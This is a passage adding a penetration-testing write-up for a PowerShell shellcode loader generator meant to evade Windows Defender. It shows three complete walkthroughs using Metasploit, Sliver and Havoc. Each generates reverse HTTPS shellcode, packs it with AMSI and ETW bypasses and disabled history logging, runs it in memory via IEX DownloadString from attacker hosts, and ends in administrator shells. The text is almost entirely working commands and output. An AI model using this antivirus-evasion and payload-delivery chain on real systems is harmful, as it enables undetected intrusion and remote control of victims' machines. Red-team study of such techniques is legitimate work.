@@ -1,0 +1,542 @@
+================================================================================================================================================
+AV bypass using my PowerShell Shellcode loader 'Invoke-PoSH-ShellCodeLoader.ps1'
+================================================================================================================================================
+
+'Invoke-PoSH-ShellCodeLoader' is a shellcode loader script generator that aims to bypass AV solutions such as Windows Defender.
+It generates an obfuscated and encrypted shellcode loader PowerShell script that will inject the shellcode into the current process's virtual address space.
+
+=> URL: https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-ShellCodeLoader
+
+FEATURES
+---------
+> Shellcode injection into the memory of the current process (PowerShell)
+> AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+> AMSI bypass
+> Blocking Event Tracing for Windows (ETW)
+> Disabling PowerShell history logging
+> Basic sandbox evasion techniques (optional)
+> stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
+> wait for 60 seconds before execution
+> Compatible with shellcodes from multiple C2 frameworks (Metasploit, Silver and Havoc)
+
+
+=====================================================================================================================================================
+PoC 1 - Example with a (x64) Meterpreter reverse HTTPS shell running on a Windows 10 laptop fully patched with Windows Defender enabled & up-to-date
+=====================================================================================================================================================
+
+---------------------------------------------------------------------------------------------
+Step 1 - Generate a stageless (x64) Meterpreter reverse HTTPS shellcode in RAW format
+---------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF/test$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.56.104 LPORT=443 -a x64 -f raw -o shellcodeMSFstagelessHTTPS 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 201308 bytes
+Saved as: shellcodeMSFstagelessHTTPS
+
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF/test$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+
+----------------------------------------------------------------------------------------------------------
+Step 2 - Create an obfuscated & encrypted shellcode loader script using 'Invoke-PoSH-ShellCodeLoader.ps1'
+----------------------------------------------------------------------------------------------------------
+
+PS C:\temp> wget -URI http://192.168.56.104:8080/shellcodeMSFstagelessHTTPS -Outfile C:\temp\shellcodeMSFstagelessHTTPS
+
+
+PS C:\temp> . .\Invoke-PoSH-ShellCodeLoader.ps1
+
+  ___     ___ _  _     ___ _        _ _  ___         _     _                _
+ | _ \___/ __| || |___/ __| |_  ___| | |/ __|___  __| |___| |   ___  __  __| |___ ___
+ |  _/ _ \__ \ __ |___\__ \ ' \/ -_) | | (__/ _ \/ _  / -_| |__/ _ \/ _|/ _  / -_)  _|
+ |_| \___/___/_||_|   |___/_||_\___|_|_|\___\___/\__,_\___|____\___/\__,\__,_\___|_|
+                                                                                     v2.0
+Usage:
+> Import-Module ./Invoke-PoSH-ShellCodeLoader.ps1
+> Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FileUrl https://URL/shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+> Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FilePath C:\path\shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+
+Features:
+[*] Shellcode injection into the memory of the current process
+[*] AES encryption and GZip/Deflate compression
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
+
+
+PS C:\temp> Invoke-PoSH-ShellCodeLoader -Type MSF -FilePath C:\temp\shellcodeMSFstagelessHTTPS -OutFile C:\temp\packed-MSFstagelessHTTPS.ps1
+[*] Loading the Meterpreter shellcode: 'C:\temp\shellcodeMSFstagelessHTTPS
+[*] Creating the shellcode loader script
+[*] File compression (GZip/Deflate)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] The obfuscated & encrypted Meterpreter shellcode loader script has been saved: 'packed-MSFstagelessHTTPS.ps1' ...
+[+] Done!
+
+PS C:\temp>
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Download & execute into memory the encrypted shellcode loader script 'packed-MSFstagelessHTTPS.ps1' without being detected 
+         by Windows Defender on a Windows 10 laptop fully patched (with MS Defender AV enabled and up-to-date)
+------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\> systeminfo
+
+Host Name:                 Laptop1
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.19044 N/A Build 19044
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Workstation
+OS Build Type:             Multiprocessor Free
+<SNIP>
+
+
+PS C:\> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 06/02/2023 06:13:32
+
+
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-MSFstagelessHTTPS.ps1');
+
+
+------------------------------------------------------------
+Step 4 - You have now a Meterpreter reverse shell running 
+------------------------------------------------------------
+
+jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.56.104; set LPORT 443;
+ set EXITFUNC thread; set ExitOnSession false; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem; 
+ set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; run -j"
+
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Search can apply complex filters such as 
+search cve:2009 type:exploit, see all the filters 
+with help search
+
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter_reverse_https
+LHOST => 192.168.56.104
+LPORT => 443
+EXITFUNC => thread
+ExitOnSession => false
+HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
+SessionCommunicationTimeout => 0
+EnableUnicodeEncoding => true
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started HTTPS reverse handler on https://192.168.56.104:443
+
+msf6 exploit(multi/handler) > 
+
+msf6 exploit(multi/handler) > 
+[*] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: mrffnfac) Redirecting stageless connection from /kuTFiI0jDUAhxCDGQiWuPQBKqH4s with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[*] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: mrffnfac) Attaching orphaned/stageless session...
+[*] Meterpreter session 1 opened (192.168.56.104:443 -> 127.0.0.1 ) at 2023-02-07 00:40:42 +0100
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: Laptop1\Administrator
+
+meterpreter > exit
+[*] Shutting down Meterpreter...
+
+
+
+=====================================================================================================================================================
+PoC 2 - Example with a (x64) SLIVER reverse HTTPS shell running on a Windows 10 laptop fully patched with Windows Defender enabled & up-to-date
+=====================================================================================================================================================
+
+----------------------------------------------------------
+Step 1 - Generate a SLIVER shellcode (stageless & session)
+----------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Sliver-C2$ sudo sliver-server 
+[sudo] password for jeff: 
+[*] Loaded 17 aliases from disk
+[*] Loaded 16 extension(s) from disk
+
+.------..------..------..------..------..------.                                               
+|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |                                               
+| :/\: || :/\: || (\/) || :(): || (\/) || :(): |                                               
+| :\/: || (__) || :\/: || ()() || :\/: || ()() |                                               
+| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|                                               
+`------'`------'`------'`------'`------'`------'                                               
+                                                                                               
+All hackers gain fear
+[*] Server v1.5.31 - kali
+[*] Welcome to the sliver shell, please type 'help' for options
+
+[server] sliver > 
+[server] sliver > generate --arch amd64 -f shellcode --http 192.168.56.104 -l --os Windows --save SliverShellcodeTest.bin
+
+[*] Generating new windows/amd64 implant binary
+[!] Symbol obfuscation is disabled
+[*] Build completed in 10s
+? Encode shellcode with shikata ga nai? No
+[*] Implant saved to /home/jeff/Documents/Tools/Sliver-C2/SliverShellcodeTest.bin
+
+Formatting the SLIVER shellcode
+- - - - - - - - - - - - - - - -
+jeff@kali:~/Documents/Tools/Sliver-C2$ sudo chmod 764 SliverShellcodeTest.bin
+[sudo] password for jeff: 
+
+jeff@kali:~/Documents/Tools/Sliver-C2$ xxd -p SliverShellcodeTest.bin | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > SliverShellcodeTest2.bin
+
+jeff@kali:~/Documents/Tools/Sliver-C2$ sed '$ s/.$//' SliverShellcodeTest2.bin > SliverShellcodeFormatted.bin
+
+jeff@kali:~/Documents/Tools/Sliver-C2$ python -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+
+----------------------------------------------------------------------------------------------------------
+Step 2 - Create an obfuscated & encrypted shellcode loader script using 'Invoke-PoSH-ShellCodeLoader.ps1'
+----------------------------------------------------------------------------------------------------------
+
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://github.com/Jean-Francois-C/Windows-Penetration-Testing/raw/master/Defense%20evasion%20(examples)/Invoke-PoSH-ShellCodeLoader/Invoke-PoSH-ShellCodeLoader.ps1');
+
+  ___     ___ _  _     ___ _        _ _  ___         _     _                _
+ | _ \___/ __| || |___/ __| |_  ___| | |/ __|___  __| |___| |   ___  __  __| |___ ___
+ |  _/ _ \__ \ __ |___\__ \ ' \/ -_) | | (__/ _ \/ _  / -_| |__/ _ \/ _|/ _  / -_)  _|
+ |_| \___/___/_||_|   |___/_||_\___|_|_|\___\___/\__,_\___|____\___/\__,\__,_\___|_|
+                                                                                     v2.0
+Usage:
+> Import-Module ./Invoke-PoSH-ShellCodeLoader.ps1
+> Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FileUrl https://URL/shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+> Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FilePath C:\path\shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+
+Features:
+[*] Shellcode injection into the memory of the current process
+[*] AES encryption and GZip/Deflate compression
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
+
+
+PS C:\temp>  Invoke-PoSH-ShellCodeLoader -Type Sliver -FileUrl http://192.168.56.104:8080/SliverShellcodeFormatted.bin -OutFile C:\temp\packed-sliver-shellcode-loader.ps1
+[*] Downloading the Sliver shellcode: 'http://192.168.56.104:8080/SliverShellcodeFormatted.bin'
+[*] Creating the shellCode loader script
+[*] File compression (GZip/Deflate)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] The obfuscated & encrypted Sliver shellcode loader script has been saved: 'C:\temp\packed-sliver-shellcode-loader.ps1' ...
+[+] Done!
+PS C:\temp>
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Download & execute into memory the encrypted shellcode loader script 'packed-sliver-shellcode-loader.ps1' without being detected 
+         by Windows Defender on a Windows 10 laptop fully patched (with MS Defender AV enabled and up-to-date)
+------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\> systeminfo
+
+Host Name:                 Laptop1
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.19044 N/A Build 19044
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Workstation
+OS Build Type:             Multiprocessor Free
+<SNIP>
+
+
+PS C:\> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 06/02/2023 06:13:32
+
+
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-sliver-shellcode-loader.ps1');
+
+
+-------------------------------------------------------------------------
+Step 4 - You have now a SLIVER reverse shell running (stageless session)
+-------------------------------------------------------------------------
+
+[server] sliver > https --lhost 192.168.56.104 --lport 80
+
+[*] Starting HTTPS :80 listener ...
+
+[*] Successfully started job #1
+
+
+[server] sliver > https --lhost 192.168.56.104 --lport 443
+
+[*] Starting HTTPS :443 listener ...
+
+[*] Successfully started job #2
+
+
+[server] sliver > jobs
+
+ ID   Name    Protocol   Port 
+==== ======= ========== ======
+ 1    https   tcp        80   
+ 2    https   tcp        443  
+
+
+[*] Session acebefba PRODUCTIVE_SCALE - 192.168.56.1:2778 (Laptop1) - windows/amd64 - Mon, 06 Feb 2023 19:39:26 CET
+
+
+[server] sliver > sessions -i acebefba
+
+[*] Active session PRODUCTIVE_SCALE (acebefba)
+
+
+[server] sliver (PRODUCTIVE_SCALE) > getuid
+
+S-1-5-21-936125016-2310263949-2175806047-500
+
+
+[server] sliver (PRODUCTIVE_SCALE) > whoami
+
+Logon ID: Laptop1\Administrator
+[*] Current Token ID: Laptop1\Administrator
+
+
+[server] sliver (PRODUCTIVE_SCALE) >
+
+
+
+=====================================================================================================================================================
+PoC 3 - Example with a (x64) HAVOC reverse HTTPS shell running on a Windows 10 laptop fully patched with Windows Defender enabled & up-to-date
+=====================================================================================================================================================
+
+-----------------------------------------------
+Step 1 - Start the HAVOC teamserver and client 
+-----------------------------------------------
+
+Start the HAVOC teamserver 
+- - - - - - - - - - - - - - 
+jeff@kali:~/Documents/Tools/HavocC2/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/jeff-havoc-profile.yaotl -v --debug
+[sudo] password for jeff:                                                                                                                                                                                                                  
+              _______           _______  _______
+    │\     /│(  ___  )│\     /│(  ___  )(  ____ \
+    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/
+    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │
+    │  ___  ││  ___  │( (   ) )│ │   │ ││ │
+    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │
+    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\
+    │/     \││/     \│   \_/   (_______)(_______/
+                                                                                                                                                                             
+                                                                                                                                                                                                                                         
+         pwn and elevate until it's done                                                                                                                                                                                                   
+                                                                                                                                                                                                                                           
+[20:04:10] [DBUG] [cmd.serverFunc:70]: Debug mode enabled                                                                                                                                                                                  
+[20:04:10] [INFO] Havoc Framework [Version: 0.4.1] [CodeName: The Fool]                                                                                                                                                                    
+[20:04:10] [INFO] Havoc profile: ./profiles/jeff-havoc-profile.yaotl                                                                                                                                                                       
+[20:04:10] [INFO] Build:                                                                                                                                                                                                                   
+ - Compiler x64 : data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc                                                                                                                                                                 
+ - Compiler x86 : /usr/bin/i686-w64-mingw32-gcc                                                                                                                                                                                            
+ - Nasm         : /usr/bin/nasm                                                                                                                                                                                                            
+[20:04:10] [INFO] Time: 06/02/2023 20:04:10          
+<SNIP>
+
+
+Start the HAVOC client 
+- - - - - - - - - - - - - - 
+jeff@kali:~/Documents/Tools/HavocC2/Havoc/Client$ ./Havoc
+Qt: Session management error: Authentication Rejected, reason : None of the authentication protocols specified are supported and host-based authentication failed                                                                          
+[20:05:05] [info] Havoc Framework [Version: 0.4.1] [CodeName: The Fool]                                                                                                                                                                    
+[20:05:06] [info] Connecting to profile: Test                                                                                                                                                                                              
+qt.qpa.xcb: QXcbConnection: XCB error: 3 (BadWindow), sequence: 477, resource id: 10650849, major code: 40 (TranslateCoords), minor code: 0                                                                                                
+[20:05:07] [error] Couldn't check if DemonClass is ready                                                                                                                                                                                   
+[20:05:07] [error] Couldn't check if AgentClass is ready                                                                                                                                                                                   
+[20:05:07] [error] Couldn't check if Event class is ready                                                                                                                                                                                  
+SystemError: type havoc.Event has the Py_TPFLAGS_HAVE_GC flag but has no traverse function      
+
+
+--------------------------------------------------
+Step 2 - Generate a new HAVOC payload (shellcode)
+--------------------------------------------------
+
+Click on “Attack” => “Payload“ => "Generate" (at the bottom of the window)
+
+Agent: Demon
+Options
+ > Listener: Test
+ > Arch: x64
+ > Format: Windows Shellcode
+Config
+ > Sleep: 2                                        //The default interval to sleep between check-ins for commands.
+ > Indirect Syscall: Enabled
+ > Sleep Technique: WaitForSIngleObjectEx          //Choose between: "WaitForSIngleObjectEx" (no obfuscation), "Ekko" and "Foliage"
+ > Injection
+   > Alloc: Native/Syscall
+   > Execute: Native/Syscall
+   > Spawn64: C:\Windows\System32\notepad.exe      //The full path to the process to spawn into for fork & run operations (64bit).
+   > Spawn32: C:\Windows\Syswow64\notepad.exe      //The full path to the process to spawn into for fork & run operations (32bit).
+
+Building Console
+[*] Starting build
+[*] Use indirect syscalls
+[*] Config size [376 bytes]
+[*] Compiling core dll...
+[*] Compiled core dll [65536 bytes]
+[*] Shellcode payload [66559 bytes]
+[+] Payload generated
+
+Payload saved under: /home/jeff/Documents/Tools/HavocC2/HavocShellcodeTest.bin
+
+Formatting the HAVOC shellcode
+- - - - - - - - - - - - - - - -
+jeff@kali:~/Documents/Tools/HavocC2$ xxd -p HavocShellcodeTest.bin | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > HavocShellcode2.bin
+
+jeff@kali:~/Documents/Tools/HavocC2$ sed '$ s/.$//' HavocShellcode2.bin > HavocShellcodeFormatted.bin
+
+jeff@kali:~/Documents/Tools/HavocC2$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+
+----------------------------------------------------------------------------------------------------------
+Step 3 - Create an obfuscated & encrypted shellcode loader script using 'Invoke-PoSH-ShellCodeLoader.ps1'
+----------------------------------------------------------------------------------------------------------
+
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://github.com/Jean-Francois-C/Windows-Penetration-Testing/raw/master/Defense%20evasion%20(examples)/Invoke-PoSH-ShellCodeLoader/Invoke-PoSH-ShellCodeLoader.ps1');
+
+  ___     ___ _  _     ___ _        _ _  ___         _     _                _
+ | _ \___/ __| || |___/ __| |_  ___| | |/ __|___  __| |___| |   ___  __  __| |___ ___
+ |  _/ _ \__ \ __ |___\__ \ ' \/ -_) | | (__/ _ \/ _  / -_| |__/ _ \/ _|/ _  / -_)  _|
+ |_| \___/___/_||_|   |___/_||_\___|_|_|\___\___/\__,_\___|____\___/\__,\__,_\___|_|
+                                                                                     v2.0
+Usage:
+> Import-Module ./Invoke-PoSH-ShellCodeLoader.ps1
+> Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FileUrl https://URL/shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+> Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FilePath C:\path\shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+
+Features:
+[*] Shellcode injection into the memory of the current process
+[*] AES encryption and GZip/Deflate compression
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
+
+PS C:\temp>
+
+PS C:\temp>  Invoke-PoSH-ShellCodeLoader -Type Havoc -FileUrl http://192.168.56.104:8080/HavocShellcodeFormatted.bin -OutFile C:\temp\packed-havoc-shellcode-loader.ps1    
+[*] Downloading the Havoc shellcode: 'http://192.168.56.104:8080/HavocShellcodeFormatted.bin'
+[*] Creating the shellCode loader script
+[*] File compression (GZip/Deflate)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] The obfuscated & encrypted Havoc shellcode loader script has been saved: 'C:\temp\packed-havoc-shellcode-loader.ps1' ...
+[+] Done!
+
+PS C:\temp>
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Download & execute into memory the encrypted shellcode loader script 'packed-havoc-shellcode-loader.ps1' without being detected 
+         by Windows Defender on a Windows 10 laptop fully patched (with MS Defender AV enabled and up-to-date)
+------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\> systeminfo
+
+Host Name:                 Laptop1
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.19044 N/A Build 19044
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Workstation
+OS Build Type:             Multiprocessor Free
+<SNIP>
+
+
+PS C:\> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 06/02/2023 06:13:32
+
+
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-havoc-shellcode-loader.ps1');
+
+
+-------------------------------------------------------------------------
+Step 5 - You have now a HAVOC reverse shell running (stageless session)
+-------------------------------------------------------------------------
+
+06/02/2023 20:04:10 [*] Started "Test" listener
+06/02/2023 20:05:06 [+] Jeff connected to teamserver
+06/02/2023 20:17:57 [*] Initialized b75374e :: Administrator@192.168.13.154 (Laptop1)
+
+[06/02/2023 20:17:57] Agent B75374E authenticated from as Laptop1\Administrator :: [Internal: 192.168.13.154] [Process: powershell.exe\17776] [Arch: x64] [Pivot: Direct]
+
+06/02/2023 20:18:41 [Jeff] Demon » help
+
+Demon Commands
+==============
+
+  Command            Type         Description
+  -------            -------      -----------
+  help               Command      Shows help message of specified command
+  sleep              Command      sets the delay to sleep
+  checkin            Command      request a checkin request
+  job                Module       job manager
+  task               Module       task manager
+  proc               Module       process enumeration and management
+  transfer           Command      download transfer module
+  dir                Command      list specified directory
+  download           Command      downloads a specified file
+  upload             Command      uploads a specified file
+  cd                 Command      change to specified directory
+  cp                 Command      copy file from one location to another
+  remove             Command      remove file or directory
+  mkdir              Command      create new directory
+  pwd                Command      get current directory
+  cat                Command      display content of the specified file
+  screenshot         Command      takes a screenshot
+  shell              Command      executes cmd.exe commands and gets the output
+  powershell         Command      executes powershell.exe commands and gets the output
+  inline-execute     Command      executes an object file
+  shellcode          Module       shellcode injection techniques
+  dll                Module       dll spawn and injection modules
+  exit               Command      cleanup and exit
+  token              Module       token manipulation and impersonation
+  dotnet             Module       execute and manage dotnet assemblies
+  net                Module       network and host enumeration module
+  config             Module       configure the behaviour of the demon session
+  pivot              Module       pivoting module
+  rportfwd           Module       reverse port forwarding
+  socks              Module       socks4a proxy
+
+
+06/02/2023 20:20:02 [Jeff] Demon » shell whoami
+[*] [D9A035E8] Tasked demon to execute a shell command
+[+] Send Task to Agent [69 bytes]
+[+] Received Output [24 bytes]:
+Laptop1\administrator
+
+
+06/02/2023 20:20:14 [Jeff] Demon » shell hostname
+[*] [5E3F47D0] Tasked demon to execute a shell command
+[+] Send Task to Agent [71 bytes]
+[+] Received Output [10 bytes]:
+Laptop1
+
+<SNIP>
